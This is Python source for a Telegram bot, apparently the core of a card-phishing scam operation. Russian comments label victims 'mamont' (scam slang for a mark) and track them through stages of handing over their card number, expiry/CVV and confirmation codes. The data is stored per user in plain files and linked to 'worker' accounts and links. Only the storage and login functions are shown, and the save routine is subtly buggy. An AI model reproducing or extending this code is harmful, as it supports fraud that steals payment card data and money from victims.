import os
from time import sleep
import colorama
import telebot
from pathlib import Path
from colorama import Back,Fore
from itertools import cycle, islice

id=[] #аналог таблицы. ОЗУ
username=[]
cash=[]
role=[]
stage=[]
card=[]
datecvv=[]
codes=[]
workerid=[]
worker=[]


links = []
Helper='qew122'
datadir='./data/'
#0 мамонт ничего не ввёл
#1 мамонт ввёл карту
#2 мамонт ввел cvv
#3 ввёл код
#4 отработан2

def getdatafromid(reqiestid):
    localid=-1
    for i in range(0,len(id)):
        if id[i]==reqiestid:
            localid=i
    return localid

def savedata():
    for i in range(0,len(id)):
        file=open(f'./data/{id[i]}.cfg','w')
        writefile=f'{id[i]}\n'
        writefile+=f'{username[i]}\n'
        writefile += f'{cash[i]}\n'
        writefile += f'{role[i]}\n'
        writefile += f'{stage[i]}\n'
        writefile += f'{card[i]}\n'
        writefile += f'{datecvv[i]}\n'
        writefile += f'{codes[i]}\n'
        writefile += f'{workerid[i]}\n'
        file.write(writefile)
    file = open(f'./data/workers.cfg', 'w')
    writefile=''
    for i in range(0,len(worker)):
        writefile+=f'{worker}\n'
    file.write(writefile)
    file = open(f'./data/links.cfg', 'w')
    writefile = ''
    for i in range(0, len(links)):
        writefile += f'{links}\n'
    file.write(writefile)


def loaddata():
    files=os.listdir(datadir)
    if len(files)==0:
        print('/// u dont have save file')
        print('/// first start. loading...')
        print('/// done. have fun, comrades')
    else:
        print(Back.GREEN+Fore.RED+'///'+Back.RESET+Fore.GREEN+' loading saves. get ready...')
        for i in range(0,len(files)):
            if files[i]!='workers.cfg' and files[i]!='links.cfg':
                file=open('./data/'+files[i], 'r')
                file=file.readlines()
                for i2 in range(0,len(file)):
                    file[i2]=file[i2][:-1]
                id.append(file[0])
                username.append(file[1])
                cash.append(file[2])
                role.append(file[3])
                stage.append(int(file[4]))
                card.append(file[5])
                datecvv.append(file[6])
                codes.append(file[7])
                workerid.append(file[8])
        file = open('./data/workers.cfg', 'r')
        file=file.readlines()
        for i2 in range(0, len(file)):
            file[i2] = file[i2][:-1]
        for i in range(0,len(file)):
            worker.append(file[i])
        file = open('./data/links.cfg', 'r')
        file = file.readlines()
        for i2 in range(0, len(file)):
            file[i2] = file[i2][:-1]
        for i in range(0, len(file)):
            links.append(file[i])

def printlogo():
    logo=open('./logo.txt','r')
    logo=logo.readlines()
    for i in range(0,len(logo)):
        print(Back.BLACK+Fore.WHITE+str(logo[i])[:-1])
    logo=open('./name.txt','r')
    logo=logo.readlines()
    for i in range(0,len(logo)):
        print(Back.BLACK+Fore.WHITE+str(logo[i])[:-1])

def checklogin(message):
    if str(message.from_user.id) not in id:
        loginUser(message)

def loginUser(message):
    id.append(str(message.from_user.id))
    username.append(message.from_user.username)
    cash.append(0)
    role.append('mamont')
    stage.append(0)
    card.append('none')
    datecvv.append('none')
    codes.append('none')
    workerid.append('none')
    print(Back.BLACK + Fore.WHITE + f'/// new user {message.from_user.username}. check ./data/' + Back.RESET)
    savedata()